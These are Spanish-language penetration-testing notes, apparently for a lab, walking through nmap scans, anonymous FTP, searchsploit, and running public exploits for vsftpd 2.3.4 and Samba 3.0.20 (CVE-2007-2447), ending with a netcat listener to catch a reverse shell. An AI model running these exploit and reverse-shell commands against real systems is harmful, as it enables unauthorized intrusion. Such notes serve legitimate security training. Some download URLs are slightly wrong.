El cliente debe entregar los objetivos a analizar, identificar si el objetivo esta activo se ejecuta el siguiente comando 

ping -c 1 10.90.10.15

es recomendable saber todos los objetivos en el segmento de red para hacer eso abrimos, una terminal en Kali Linux y empleando la herramienta nmap

adicionar el objetivo al archivo /etc/hosts

10.90.10.15   mipagina.com

Herramienta 01 

NMAP TCP 

para poder identificar todos los objetivos de un segmento de red emplear este comando 

nmap 10.90.10.0/24

para identificar los puertos abiertos en un objetivo

nmap -p- --open -T5 -v -n -Pn 10.90.10.15 
nmap -p- -sS --min-rate 5000 --open -vvv -n –Pn 10.90.10.15 

para en detalle identificar los servircios que corren en los puertos 

nmap -sCV -p21 10.90.10.15 -o nmap.txt


*FTP (TCP/21)

para enumerar el puerto FTP verifique que cuenta con acceso annimo (Anonymous FTP)

ftp 10.90.10.15
colocar como usuario anonymous

comandos utiles dentro de ftp que se pueden ejecutar 

explorar directorios = dir o ls
ayuda = help ver todos los comandos 

buscar vulnerabilidades de ftp, nmap arroja la version del servicio FTP es vsftpd 2.3.4, podermos usar una herramienta para buscar vulnerabilidades 


SEARCHSPLOIT

Searchsploit es una utilidad que nos permite identificar vulnerabilidades y exploit asociados a un servicio 

desde la terminal actualizar la base de datos de la herramienta 

searchsploit -u
searchsploit vsftpd 2.3.4

GOOGLE

otra herramienta para encontar vulnerabilidaes y explois es google 

en el navegador escribir google vsftpd 2.3.4 exploit 

se encuentra en github un exploit para esta version de ftp 

https://github.com/ahervias77/vsftpd-2.3.4-exploit

estes exploit tiene un ejemplo de uso 

./vsftpd_234_exploit.py [IP address] [port] [command] 
Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami

se descarga el archivo con la utilidad wget 

wget https://github.com/ahervias77/vsftpd-2.3.4-exploit.py

se ejecuta 

./vsftpd_234_exploit.py 10.90.10.15 21 whoami

python3 vsftpd_234_exploit.py 10.90.10.15 21 whoami

*SAMBA (TCP 139 y 445)

nmap -sCV -p139,445 10.90.10.15 -o nmap.txt

version samba smbd 3.0.20 

explorar samba con la utilidad crackmapexec

crackmapexec smb --shares 10.90.10.15 -u '' -p ''

SEARCHSPLOIT

searchsploit samba 3.0.20 

otra herramienta para encontar vulnerabilidaes y explois es google 

en el navegador escribir google samba 3.0.20 exploit o buscar el CVE
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) con CVE 2007-2447

se encuentra este enlace 

https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

se identifica como se utiliza el exploit 

python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>

instalacion 

sudo apt install python python-pip
pip install --user pysmb
git clone https://github.com/amriunix/CVE-2007-2447.git

o descargar el archivo y ejecutarlo 

wget https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py

python usermap_script.py 10.90.10.15 445 <miIP> 80

desde otra terminal habilitar un netcat para obtener una shell inversa 

nc -lvnp 80





